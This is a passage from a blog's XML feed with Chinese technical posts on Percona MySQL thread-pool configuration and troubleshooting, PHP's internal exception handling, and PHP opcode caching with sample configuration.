Pool运作，只是简单描述，省略了大量的复杂逻辑，请不要挑刺</p><ul><li>Step1：请求连接到MySQL，根据threadid%thread_pool_size确定落在哪个group；</li><li>Step2：group中的listener线程监听到所在的group有新的请求以后，检查队列中是否有请求还未处理。如果没有，则自己转换为worker线程立即处理该请求，如果队列中还有未处理的请求，则将对应请求放到队列中，让其他的线程处理；</li><li>Step3：group中的thread线程检查队列的请求，如果队列中有请求，则进行处理，如果没有请求，则休眠，一直没有被唤醒，超过thread_pool_idle_timeout后就自动退出。线程结束。当然，获取请求之前会先检查group中的running线程数是否超过thread_pool_oversubscribe+1，如果超过也会休眠；</li><li>Step4：timer线程定期检查各个group是否有阻塞，如果有，就对wokrer线程进行唤醒或者创建一个新的worker线程。</li></ul><h5 id="Thread-Pool的分配机制"><a href="#Thread-Pool的分配机制" class="headerlink" title="Thread Pool的分配机制"></a>Thread Pool的分配机制</h5><p>线程池会根据参数thread_pool_size的大小分成若干的group，每个group各自维护客户端发起的连接，当客户端发起连接到MySQL的时候，MySQL会跟进连接的线程id（thread_id）对thread_pool_size进行取模，从而落到对应的group。</p><p>thread_pool_oversubscribe参数控制每个group的最大并发线程数，每个group的最大并发线程数为thread_pool_oversubscribe+1个。若对应的group达到了最大的并发线程数，则对应的连接就需要等待。这个分配机制在某个group中有多个慢SQL的场景下会导致普通的SQL运行时间很长，这个问题会在后面做详细描述。</p><h4 id="MySQL线程池参数说明"><a href="#MySQL线程池参数说明" class="headerlink" title="MySQL线程池参数说明"></a>MySQL线程池参数说明</h4><p>关于线程池参数不多，使用show variables like ‘thread%’可以看到如下图的参数，下面就一个一个来解析：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic5.webp"><ul><li><strong>thread_handling</strong></li></ul><p>该参数是配置线程模型，默认情况是one-thread-per-connection，即不启用线程池；将该参数设置为pool-of-threads即启用了线程池。</p><ul><li><strong>thread_pool_size</strong></li></ul><p>该参数是设置线程池的Group的数量，默认为系统CPU的个数，充分利用CPU资源。</p><ul><li><strong>thread_pool_oversubscribe</strong></li></ul><p>该参数设置group中的最大线程数，每个group的最大线程数为thread_pool_oversubscribe+1，注意listener线程不包含在内。</p><ul><li><strong>thread_pool_high_prio_mode</strong></li></ul><p>高优先级队列的控制参数，有三个值（transactions/statements/none），默认是transactions，三个值的含义如下：</p><p>transactions：对于已经启动事务的语句放到高优先级队列中，不过还取决于后面的thread_pool_high_prio_tickets参数。</p><p>statements：这个模式所有的语句都会放到高优先级队列中，不会使用到低优先级队列。</p><p>none：这个模式不使用高优先级队列。</p><ul><li><strong>thread_pool_high_prio_tickets</strong></li></ul><p>该参数控制每个连接最多语序多少次被放入高优先级队列中，默认为4294967295，注意这个参数只有在thread_pool_high_prio_mode为transactions的时候才有效果。</p><ul><li><strong>thread_pool_idle_timeout</strong></li></ul><p>worker线程最大空闲时间，默认为60秒，超过限制后会退出。</p><ul><li><strong>thread_pool_max_threads</strong></li></ul><p>该参数用来限制线程池最大的线程数，超过该限制后将无法再创建更多的线程，默认为100000。</p><ul><li><strong>thread_pool_stall_limit</strong></li></ul><p>该参数设置timer线程的检测group是否异常的时间间隔，默认为500ms。</p><h3 id="MySQL线程池的使用"><a href="#MySQL线程池的使用" class="headerlink" title="MySQL线程池的使用"></a>MySQL线程池的使用</h3><p>线程池的使用比较简单，只需要添加配置后重启实例即可。</p><p>具体配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#thread pool</span><br><span class="line">thread_handling=pool-of-threads</span><br><span class="line">thread_pool_oversubscribe=3</span><br><span class="line">thread_pool_size=24</span><br><span class="line">performance_schema=off</span><br><span class="line">#extra connection</span><br><span class="line">extra_max_connections = 8</span><br><span class="line">extra_port = 33333</span><br></pre></td></tr></table></figure><p>备注：其他参数默认即可</p><p>以上具体的参数在前面已做详细说明，下面是配置中需要注意的两个点：</p><ol><li>之所以添加performance_schema=off，是由于测试过程中发现Thread pool和PS同时开启的时候会出现内存泄漏问题（后文会详细叙述）；</li><li>添加extra connection是防止线程池满的情况下无法登录MySQL，因此特意用管理端口，以备紧急的情况下使用；</li></ol><p>重启实例后，可以通过show variables like ‘%thread%’;来查看配置的参数是否生效。</p><h3 id="使用中遇到的问题"><a href="#使用中遇到的问题" class="headerlink" title="使用中遇到的问题"></a>使用中遇到的问题</h3><p>在使用线程池的过程中，我遇到了几个问题，这里也顺便做个总结：</p><h4 id="内存泄漏问题"><a href="#内存泄漏问题" class="headerlink" title="内存泄漏问题"></a>内存泄漏问题</h4><p>DB启用线程池后，内存飙升了8G左右，如下图：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic6.webp"><p>不但启用线程池后内存飙升了8G左右，而且内存还在持续增长，很明显启用线程池后存在内存泄漏问题了。</p><p>网上也有不少的人遇到这个问题，确认是percona的bug导致（<a href="https://jira.percona.com/browse/PS-3734" target="_blank" rel="noopener">https://jira.percona.com/browse/PS-3734</a>），只有开启Performance_Schema和ThreadPool的时候才会出现，解决办法是关闭Performance_Schema，具体操作方法是在配置文件添加performance_schema=off，然后重启MySQL就OK。</p><p>下面是关闭PS后的内存使用情况对比：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic7.webp"><p>备注：目前Percona server 5.7.21-20版本已经修复了线程池和PS同时打开内存泄漏的问题，从我测试的情况来看问题也得到了解决，大家可以直接使用Percona server 5.7.21-20的版本，如下图。</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic8.webp"><h4 id="拨测异常问题"><a href="#拨测异常问题" class="headerlink" title="拨测异常问题"></a>拨测异常问题</h4><p>启用线程池以后，相当于限制了MySQL的并发线程数，当达到最大线程数的时候，其他的线程需要等待，新连接也会卡在连接验证那一步，这时候会造成拨测程序连接MySQL超时，拨测返回错误如下：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic9.webp"><p>拨测程序连接实例超时后，就会认为master已经出现问题。极端情况下，重试多次都有异常后，就启动自动切换的操作，将业务切换到从机。</p><p>这种情况有两种解决办法：</p><p>1、启用MySQL的旁路管理端口，监控和高可用相关直接使用MySQL的旁路管理端口。</p><p>具体做法为：在my.cnf中添加如下配置后重启，就可以通过旁路端口登录MySQL了，不受线程池最大线程数的影响：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extra_max_connections = 8</span><br><span class="line">extra_port = 33333</span><br></pre></td></tr></table></figure><p>备注：建议启用线程池后，把这个也添加上，方便紧急情况下进行故障处理。</p><p>2、修改高可用探测脚本，将达到线程池最大活动线程数返回的错误做异常处理，当作超过最大连接数的场景。（备注：超过最大连接数只告警，不进行自动切换）</p><h4 id="慢SQL引入问题"><a href="#慢SQL引入问题" class="headerlink" title="慢SQL引入问题"></a>慢SQL引入问题</h4><p>随着对拨测超时的问题的深入分析，线程池满只是监控拨测出现超时的其中一种情况，还有一种情况是线程池并没有满，线上的两个配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread_pool_oversubscribe=3</span><br><span class="line">thread_pool_size=24</span><br></pre></td></tr></table></figure><p>按照上面的两个配置来计算的话，总共能并发运行24x(3+1)=96，但是根据多次问题的追中，发现有多次线程池并没有达到96，也就是说整体的线程池并没有满。那会是什么问题导致拨测失败呢？</p><p>鉴于线程池的结构和分配机制，通过前面线程池部分的描述，大家都知道了在内部是将线程池分成一个一个的group，我们线上配置了24个group，而线程池的分配机制是对Threadid进行取模，然后确定该线程是落在哪个group。</p><p>出现超时的时候，有很多的load线程到导入数据。也就是说那个时候有部分线程比较慢的情况。那么会不会是某个group的线程满了，从而导致新分配的线程等待？</p><p>有了这个猜想以后，接下来就是来验证这个问题。验证分为两步：</p><p>1、抓取线上运行的processlist，然后对threadid取模，看看是否有多个load线程落在同一个group的情况；</p><p>2、在测试环境模拟这种场景，看看是否符合预期。</p><p><strong>线上场景分析</strong></p><p>先来看线上的场景，通过抓取拨测超时时间点的processlist，找出当时正在load的线程，根据threadid进行去模，并进行汇总统计后，得出如下结果：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic10.webp"><p>可以看出，当时第4和第7个group的请求个数都超过了4个，说明是单个group满导致的拨测异常。当然，也会导致部分运行很快的SQL变慢。</p><p><strong>测试环境模拟场景分析</strong></p><p>为了构建快速重现环境，我将参数调整如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread_pool_oversubscribe=1</span><br><span class="line">thread_pool_size=2</span><br></pre></td></tr></table></figure><p>通过上面参数的调整，可以计算出最大并发线程为2x(1+1)=4，如下图，当活动线程数超过4个后，其他的线程就必须等待：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic11.webp"><p>我模拟线上环境的方法为开启1个线程的慢SQL，这时测试环境的线程池情况如下：</p><img src="/2019/03/30/2019-03-30-MySQL线程池/pic12.webp"><p>按照之前的推测，这时Group1的处理能力相当于Group2的处理能力的50%，如果之前的推论是正确的，那么分配在Group1上的线程就会出现阻塞。</p><p>比如此时来了20个线程请求，按照线程池的分配原则，此时Group1和Group2都会分到10个线程请求。如果所有的线程请求耗时都是一样的，那么分配到Group1上的线程请求整体处理时间应该是分配到Group2上整体处理时间的2倍。</p><p>我使用脚本，并发起12个线程请求，每个线程请求都运行select sleep(2)，那么在Group1和Group2都空闲的情况下，运行情况如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2018-03-18-20:23:53</span><br><span class="line">2018-03-18-20:23:53</span><br><span class="line">2018-03-18-20:23:53</span><br><span class="line">2018-03-18-20:23:53</span><br><span class="line">2018-03-18-20:23:55</span><br><span class="line">2018-03-18-20:23:55</span><br><span class="line">2018-03-18-20:23:55</span><br><span class="line">2018-03-18-20:23:55</span><br><span class="line">2018-03-18-20:23:57</span><br><span class="line">2018-03-18-20:23:57</span><br><span class="line">2018-03-18-20:23:57</span><br><span class="line">2018-03-18-20:23:57</span><br></pre></td></tr></table></figure><p>每次4个线程，总共运行了6秒。</p><p>接下来在Group1被1个长时间运行的线程沾满以后，看看测试结果是怎么样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2018-03-18-20:24:35</span><br><span class="line">2018-03-18-20:24:35</span><br><span class="line">2018-03-18-20:24:35</span><br><span class="line">2018-03-18-20:24:37</span><br><span class="line">2018-03-18-20:24:37</span><br><span class="line">2018-03-18-20:24:37</span><br><span class="line">2018-03-18-20:24:39</span><br><span class="line">2018-03-18-20:24:39</span><br><span class="line">2018-03-18-20:24:39</span><br><span class="line">2018-03-18-20:24:41 //空闲线程</span><br><span class="line">2018-03-18-20:24:43 //空闲线程</span><br><span class="line">2018-03-18-20:24:45 //空闲线程</span><br></pre></td></tr></table></figure><p>从上面的结果中可以看出，在没有阻塞的时候，每次都是4个线程，而后面有1个线程长时间运行的时候，就会出现那个长时间线程对应的group出现排队的情况，最后虽然有3个空闲的线程，但是却只有1个线程在处理。</p><p><strong>解决方法有两个：</strong></p><ol><li>将thread_pool_oversubscribe适当调大，这个办法只能缓解类似问题，无法根治；</li><li>找到慢的SQL，解决慢的问题。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP之深入理解异常机制</title>
      <link href="/2019/03/29/2019-03-29-PHP%E4%B9%8B%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6/"/>
      <url>/2019/03/29/2019-03-29-PHP%E4%B9%8B%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> PHP的异常机制的原理是什么 <i class="fa fa-quote-right"></i></p><a id="more"></a><p>PHP的异常机制的原理是什么？</p><p>在PHP每一个可独立执行的op array最后的ZEND_HANDLE_EXCEPTION是用来干什么呢?</p><p>让我们从一个问题说起, 上周的时候, blue5tar提了一个问题:“对于下面的代码, onError明明执行了, 但是onException却没有执行, 为什么?”.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onError</span><span class="params">($errCode, $errMesg, $errFile, $errLine)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error Occurred\n"</span>;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>($errMesg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onException</span><span class="params">($e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">set_error_handler(<span class="string">"onError"</span>);</span><br><span class="line"> </span><br><span class="line">set_exception_handler(<span class="string">"onException"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 我从不会以我的名字命名文件, 所以这个文件不存在 */</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"laruence.php"</span>);</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error Occurred</span><br><span class="line">PHP Fatal error:  main(): Failed opening required &apos;laruence.php&apos;</span><br></pre></td></tr></table></figure><p>首先, 我们要知道, Require在包含一个找不到的问题的时候, 会前后抛出俩个错误,</p><ol><li>WARNING : 在PHP试图打开这个文件的时候抛出.</li><li>E_COMPILE_ERROR : 从PHP打开文件的函数返回失败以后抛出.</li></ol><p>而我们知道, set_error_handler是不能捕获E_COMPILE_ERROR错误的:</p><blockquote><p>The following error types cannot be handled with a user defined function: E_ERROR, E_PARSE, E_CORE_ERROR, E_CORE_WARNING, E_COMPILE_ERROR, E_COMPILE_WARNING, and most of E_STRICT raised in the file where set_error_handler() is called.</p></blockquote><p>所以, 在onError中, 只能捕获到第一个WARNING错误, 而在onError中抛出的异常, 为什么没有被默认exception_handler捕获呢?</p><p>这就要说说PHP的异常机制了.</p><p>了解opcode的同学都知道, 在PHP5.3以前, 每一个可独立运行的op array(文件, 函数, 方法)的最后一条opcode都是ZEND_HANDLE_EXCEPTION, 而这个opcode是做什么用的呢?</p><p>原来在PHP中, 当有异常被throw的时候, 会跳到每一个op array的最后一行, 来执行这条ZEND_HANDLE_EXCEPTION, 伪码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void on_throw_exception(zval *<span class="keyword">exception</span> TSRMLS_DC) &#123;</span><br><span class="line"><span class="number">1.</span> 判断是否已经有异常抛出</span><br><span class="line"><span class="number">2.</span> 记录<span class="keyword">exception</span></span><br><span class="line"><span class="number">3.</span> 记录下一条要执行的op line的序号</span><br><span class="line"><span class="number">4.</span> 下一条要执行的op line序号 = 当前op <span class="keyword">array</span>的最后一条</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恩, 就和改写ip寄存器一样, 改写下一条要执行的op line的序号, 就改变了程序的流向, 这样, 就会进入到了ZEND_HANDLE_EXCEPTION的处理逻辑中.</p><p>而在ZEND_HANDLE_EXCEPTION中, 会判断这个异常是否在try catch中,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是    则把下一条要执行的op line, 置为第一个catch的op line, 并继续执行.</span><br><span class="line">如果不是  则销毁一些不需要的变量, 和opline,  然后直接结束执行过程.</span><br></pre></td></tr></table></figure><p>有的同学要问了:”那set_exception_handler设置的异常默认处理函数(user_exception_handler)什么时候起作用呢?”</p><p>恩, 是在执行完成退出执行LOOP以后才判断是否有默认异常处理函数, 如果有才调用:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//执行</span></span><br><span class="line">zend_execute(EG(active_op_array) TSRMLS_CC);</span><br><span class="line"><span class="keyword">if</span> (EG(<span class="keyword">exception</span>)) &#123;</span><br><span class="line">     <span class="keyword">if</span> (EG(user_exception_handler)) &#123;</span><br><span class="line">          调用用户定义的默认异常处理函数</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          未捕获的异常</span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     没有异常</span><br><span class="line">&#125;</span><br><span class="line">destroy_op_array(EG(active_op_array) TSRMLS_CC);</span><br><span class="line">efree(EG(active_op_array));</span><br></pre></td></tr></table></figure><img src="/2019/03/29/2019-03-29-PHP之深入理解异常机制/pic1.png"><p>注: 图中有一处不严谨, 即在确定是否最后一个catch块的时候, 会同时判断(is_a), 如果是才进入最后一个catch块执行.</p><p>而PHP在遇到Fatal Error的时候, 会直接zend_bailout, 而zend_bailout会导致程序流程直接跳过上面代码段, 也可以理解为直接exit了(longjmp), 这就导致了user_exception_handler没有机会发生作用.</p><p>了解到这些, 我想文章开头的问题的为什么? 也就很清晰了吧?</p><p>最后, 关于ZEND_HANDLE_EXCEPTION, 也许有同学会有疑问: 如果是这样, 那为什么每一个可独立执行的op array最后都有这个ZEND_HANDLE_EXCEPTION呢? 最简单的, 如果一个函数中不会throw, 那么这个opcode 是明显不需要的啊? 嘿嘿, 你很聪明, PHP 5.3开始, 已经按照你的想法调整了.. 只有在throw时刻, 才会动态的生成ZEND_HANDLE_EXCEPTION opline.</p><p>详见鸟哥博客：<a href="http://www.laruence.com/php-internal" target="_blank" rel="noopener">PHP源码分析</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP之深入理解Opcode缓存</title>
      <link href="/2019/03/28/2019-03-28-PHP%E4%B9%8B%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Opcode%E7%BC%93%E5%AD%98/"/>
      <url>/2019/03/28/2019-03-28-PHP%E4%B9%8B%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Opcode%E7%BC%93%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 操作码（Operate Code，opcode） <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="编译与解释"><a href="#编译与解释" class="headerlink" title="编译与解释"></a>编译与解释</h3><p>编译器是把源程序的每一条语句都编译成机器语言，并保存成二进制文件，这样运行时计算机可以直接以机器语言来运行此程序，速度很快；而解释器则是只在执行程序时，才一条一条的解释成机器语言给计算机来执行，所以运行速度是不如编译后的程序运行的快的。</p><p>解释型语言的实现中，翻译器并不产生目标机器代码，而是产生易于执行的中间代码，这种中间代码与机器代码是不同的，中间代码的解释是由软件支持的，不能直接使用硬件，软件解释器通常会导致执行效率较低。用解释型语言编写的程序是由另一个可以理解中间代码的解释程序执行的。与编译程序不同的是，解释程序的任务是逐一将源程序的语句解释成可执行的机器指令，不需要将源程序翻译成目标代码后再执行。对于解释型Basic语言，需要一个专门的解释器解释执行</p><p><strong>在很多时候我们成为编译，但是它实际是进行解释的</strong></p><p>对于一个编译型程序，它的编译和执行是分开的，先编译成二进制可执行文件，然后在次执行。</p><p>对于PHP、Python属于解释型语言，不产生机器码，而是产生中间码（中间码是不能直接执行，这个中间码只有解释器可以识别到，中间码要靠解析器来进行执行）</p><p><strong>比如说PHP的解析器是Zend，PHP使用Zend引擎，中间码我们也称作为操作码（opcode）</strong></p><p>Basic程序，每条语言只有在执行才被翻译。这种解释型语言每执行一次就翻译一次，因而效率低下。</p><ol><li>编辑：用编辑软件（EDIT.EXE或记事本）形成源程序（.ASM）,如：LX.ASM;</li><li>汇编：用汇编程序（MASM.EXE）对源程序进行汇编，形成目标文件（.OBJ），格式如下：MASM LX.ASM;</li><li>连接：用连接程序（LINK.EXE）对目标程序进行连接，形成可执行文件（.EXE），格式如下：LINK LX.OBJ;</li><li>执行：如果结果在屏幕在显示，则直接执行可执行文件。</li><li>调试：用调试程序（DEBUG.EXE）对可执行文件进行调试，格式如下：DEBUG LX.EXE</li></ol><p>鸟哥在博客中说，提高PHP 7性能的几个tips，第一条就是开启opache，引用下原文：</p><blockquote><p>记得启用Zend Opcache，因为PHP7即使不启用Opcache速度也比PHP-5.6启用了Opcache快。</p></blockquote><p>APC与Opcache都是字节码缓存也就是，PHP在被编译的时候，首先会把php代码转换为字节码，字节码然后被执行。</p><p>php文件第二次执行时，同样还是会重新转换为字节码，但是很多时候，文件内容几乎是一样的，比如静态HTML文件，生成后内容许久都不会改变，用户访问请求直接由服务器读取响应给客户端浏览器。都不用经过PHP进行解析构建了。</p><p>内存中的字节码（opcode）数据，可以直接缓存进行二次编译。这样程序就会快一些，cpu的消耗也少了。</p><h3 id="什么是Opcode缓存"><a href="#什么是Opcode缓存" class="headerlink" title="什么是Opcode缓存"></a>什么是Opcode缓存</h3><p>当解释器完成对脚本代码的分析后，便将它们生成可以直接运行的中间代码，也称为操作码（Operate Code，opcode）。Opcode cache的目地是避免重复编译，减少CPU和内存开销。如果动态内容的性能瓶颈不在于CPU和内存，而在于I/O操作，比如数据库查询带来的磁盘I/O开销，那么opcode cache的性能提升是非常有限的。但是既然opcode cache能带来CPU和内存开销的降低，这总归是好事。</p><p>现代操作码缓存器（Optimizer+，APC2.0+，其他）使用共享内存进行存储，并且可以直接从中执行文件，而不用在执行前“反序列化”代码。这将带来显着的性能加速，通常降低了整体服务器的内存消耗，而且很少有缺点。</p><h3 id="为什么要使用Opcode缓存"><a href="#为什么要使用Opcode缓存" class="headerlink" title="为什么要使用Opcode缓存"></a>为什么要使用Opcode缓存</h3><p>这得从PHP代码的生命周期说起，请求PHP脚本时，会经过五个步骤，如下图所示：</p><img src="/2019/03/28/2019-03-28-PHP之深入理解Opcode缓存/pic1.png"><p>Zend引擎必须从文件系统读取文件、扫描其词典和表达式、解析文件、创建要执行的计算机代码（称为Opcode），最后执行Opcode。每一次请求PHP脚本都会执行一遍以上步骤，如果PHP源代码没有变化，那么Opcode也不会变化，显然没有必要每次都重行生成Opcode，结合在Web中无所不在的缓存机制，我们可以把Opcode缓存下来，以后直接访问缓存的Opcode岂不是更快，启用Opcode缓存之后的流程图如下所示：</p><img src="/2019/03/28/2019-03-28-PHP之深入理解Opcode缓存/pic2.png"><h3 id="有哪些PHP-Opcode缓存插件"><a href="#有哪些PHP-Opcode缓存插件" class="headerlink" title="有哪些PHP Opcode缓存插件"></a>有哪些PHP Opcode缓存插件</h3><p>Optimizer+（Optimizer+于2013年3月中旬改名为Opcache，PHP 5.5集成Opcache，其他的会不会消失？）、eAccelerator、xcache、APC …</p><p>PHP 5.5+版本以上的，可以使用PHP自带的opcache开启性能加速（默认是关闭的），PHP5.5之后opcache可以直接<code>--enable-opcache</code> 。</p><p>php.ini：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[opcache]</span></span><br><span class="line"><span class="comment">; 开关打开</span></span><br><span class="line"><span class="attr">opcache.enable</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 设置共享内存大小, 单位为：Mb</span></span><br><span class="line"><span class="attr">opcache.memory_consumption</span>=<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 如果启用，那么 OPcache 会每隔 opcache.revalidate_freq 设定的秒数 检查脚本是否更新。</span></span><br><span class="line"><span class="comment">; 如果禁用此选项，你必须使用 opcache_reset() 或者 opcache_invalidate() 函数来手动重置 OPcache，也可以 通过重启 Web 服务器来使文件系统更改生效。</span></span><br><span class="line"><span class="attr">opcache.validate_timestamps</span>=<span class="number">60</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#提示：在opcache使用软连接的情况下，会存在opcache没有被清除的情况.可以使用重启fastcgi来解决这个问题.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">zend_extension</span>=<span class="string">"opcache.so"</span></span><br></pre></td></tr></table></figure><h3 id="PHP-Opcode原理"><a href="#PHP-Opcode原理" class="headerlink" title="PHP Opcode原理"></a>PHP Opcode原理</h3><p>Opcode是一种PHP脚本编译后的中间语言，就像Java的ByteCode,或者.NET的MSL，举个例子，比如你写下了如下的PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Hello World"</span>;</span><br><span class="line">   $a = <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP执行这段代码会经过如下4个步骤(确切的来说，应该是PHP的语言引擎Zend)：</p><ol><li>Scanning(Lexing) ,将PHP代码转换为语言片段(Tokens)</li><li>Parsing, 将Tokens转换成简单而有意义的表达式</li><li>Compilation, 将表达式编译成Opocdes</li><li>Execution, 顺次执行Opcodes，每次一条，从而实现PHP脚本的功能。</li></ol><p>题外话：现在有的Cache比如APC,可以使得PHP缓存住Opcodes，这样，每次有请求来临的时候，就不需要重复执行前面3步，从而能大幅的提高PHP的执行速度。</p><p>那什么是Lexing? 学过编译原理的同学都应该对编译原理中的词法分析步骤有所了解，Lex就是一个词法分析的依据表。 Zend/zend_language_scanner.c会根据Zend/zend_language_scanner.l(Lex文件),来输入的 PHP代码进行词法分析，从而得到一个一个的“词”，PHP4.2开始提供了一个函数叫token_get_all,这个函数就可以讲一段PHP代码 Scanning成Tokens；</p><p>如果用这个函数处理我们开头提到的PHP代码，将会得到如下结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span 